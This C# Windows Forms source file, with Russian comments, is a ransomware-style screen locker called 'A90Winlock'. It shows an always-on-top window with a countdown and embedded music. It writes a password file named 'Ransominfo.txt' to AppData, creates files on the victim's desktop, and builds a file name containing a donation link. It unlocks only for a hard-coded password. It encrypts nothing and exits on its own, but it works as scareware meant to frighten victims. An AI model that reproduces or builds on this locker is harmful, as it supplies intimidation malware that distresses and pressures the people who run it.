using System;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Timers;
using System.Windows.Forms;
using System.Threading;


namespace A90Winlock
{
    public partial class Form1 : Form
    {

        [DllImport("winmm.dll", EntryPoint = "PlaySound", CharSet = CharSet.Auto)]
        private static extern bool PlaySound(string pszSound, IntPtr hmod, uint fdwSound);


        private const uint SND_FILENAME = 0x00020000;
        private const uint SND_SYNC = 0x0000;
        private System.Windows.Forms.Timer Timer;
        private int secondsLeft = 120;

        public Form1()
        {
            InitializeComponent();

            try
            {
                // 1. Получаем путь к папке AppData\Roaming текущего пользователя
                string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                // 2. Объединяем путь с именем твоего файла
                string textFilePath = System.IO.Path.Combine(appDataPath, "Ransominfo.txt");

                // 3. Текст, который запишется внутрь файла
                string fileContent = "HI password:GWkd2003ArR9g]<CuVy,xWw$;mG[JA_iJn%VAtVDD0(C+ky!OP{}wDaM>atRcrLk";

                // 4. Создаем файл и записываем в него текст (если он уже был, он перезапишется)
                System.IO.File.WriteAllText(textFilePath, fileContent);
            }
            catch (Exception ex)
            {
                
            }


            this.TopMost = true;


            this.Load += Form1_Load;

            Form2 form2 = new Form2();
            form2.Show();


            label2.Text = "01:18";


            label2.Tag = 78;


            System.Windows.Forms.Timer t = new System.Windows.Forms.Timer { Interval = 1000 };



            t.Tick += (s, ea) =>
            {
                int secondsLeft = (int)label2.Tag - 1;
                label2.Tag = secondsLeft;


                label2.Text = string.Format("{0:D2}:{1:D2}", secondsLeft / 60, secondsLeft % 60);


                if (secondsLeft <= 0)
                {
                    t.Stop();
                    Application.Exit();
                }
            };

            // 6. Запускаем таймер в работу
            t.Start();

            PlayAllTracks();


        }


        private void button1_Click(object sender, EventArgs e)
        {
   
            if (textBox1.Text == @"GWkd2003ArR9g]<CuVy,xWw$;mG[JA_iJn%VAtVDD0(C+ky!OP{}wDaM>atRcrLk")
            {
                
                PlaySound(null, IntPtr.Zero, 0);
                // кароч это таймер и музон останавливает
                if (Timer != null) Timer.Stop();
                //дальше идёт закрытие 2 форма интересно // ваще ктото юзает? насерёз
                foreach (Form openForm in Application.OpenForms)
                {
                    if (openForm.Name == "Form2")
                    {
                        openForm.Close();
                        break;
                    }
                }


                Form4 form4 = new Form4();

                form4.Show();

                foreach (Form openForm in Application.OpenForms)
                {
                    if (openForm.Name == "Form1")
                    {
                        openForm.Close();
                        break;
                    }
                }
            }

        }

        private async void label2_Click(object sender, EventArgs e)
        {



        }

        private void Form1_Load(object sender, EventArgs e)
        {
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);




            string filePath = Path.Combine(desktopPath, "Loced.txt");
            string Ransom = Path.Combine(desktopPath, "ransom.ransom");
            string cripts = Path.Combine(desktopPath, "cript https://www.donationalerts.com/r/1mmst1off.txt");




            using (File.Create(filePath)) { }

        }

        private void Form_Locer(object sender, EventArgs e)
        {

        }


        private void Form_crateFile(object sender, EventArgs e)
        {

        }

        private void PlayAllTracks()
        {
            System.Threading.Tasks.Task.Run(() =>
            {
                try
                {
                    var assembly = System.Reflection.Assembly.GetExecutingAssembly();

                    // Автоматически находим точные имена внедренных файлов внутри EXE
                    string res1 = null, res2 = null, res3 = null;
                    foreach (string name in assembly.GetManifestResourceNames())
                    {
                        if (name.EndsWith("layer1.wav")) res1 = name;
                        if (name.EndsWith("layer2.wav")) res2 = name;
                        if (name.EndsWith("layer3.wav")) res3 = name;
                    }

                    // 1. Играем первый трек прямо из памяти EXE
                    if (res1 != null)
                    {
                        using (var stream1 = assembly.GetManifestResourceStream(res1))
                        using (var player1 = new System.Media.SoundPlayer(stream1))
                        {
                            player1.PlaySync();
                        }
                    }

                    // 2. Первый кончился — играем второй из памяти EXE
                    if (res2 != null)
                    {
                        using (var stream2 = assembly.GetManifestResourceStream(res2))
                        using (var player2 = new System.Media.SoundPlayer(stream2))
                        {
                            player2.PlaySync();
                        }
                    }

                    // 3. Второй кончился — играем третий из памяти EXE
                    if (res3 != null)
                    {
                        using (var stream3 = assembly.GetManifestResourceStream(res3))
                        using (var player3 = new System.Media.SoundPlayer(stream3))
                        {
                            player3.PlaySync();
                        }
                    }

                    // Когда вся музыка полностью отыграла — закрываемся
                    this.Invoke((MethodInvoker)delegate {
                        Application.Exit();
                    });
                }
                catch { }
            });
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
// пароль GWkd2003ArR9g]<CuVy,xWw$;mG[JA_iJn%VAtVDD0(C+ky!OP{}wDaM>atRcrLk привет тому кто смотрит код есличто найти пароль можно в аппдате!